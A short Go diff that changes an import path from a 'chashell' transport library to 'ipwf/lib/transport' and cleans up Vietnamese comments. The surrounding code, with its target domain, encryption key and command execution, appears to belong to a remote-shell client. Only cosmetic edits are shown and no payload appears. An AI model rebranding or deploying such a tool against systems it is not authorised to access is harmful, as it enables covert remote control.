@@ -1,13 +1,13 @@
 package main
 
 import (
-	"github.com/hdqb/chashell/lib/transport"
+	"fmt"
+	"ipwf/lib/transport"
 	"os/exec"
 	"runtime"
-	"fmt"
 )
 
-// khởi tạo 2 mảng chứa tên miền và encryptionKey 
+// khởi tạo 2 mảng chứa tên miền và encryptionKey
 var (
 	targetDomain  string
 	encryptionKey string
@@ -43,7 +43,7 @@ func main() {
 	//	khởi tạo err bằng cách chạy cmd.Run()
 	err := cmd.Run()
 
-	// nếu có lỗi sẽ trả về 
+	// nếu có lỗi sẽ trả về
 	if err != nil {
 		return
 	}
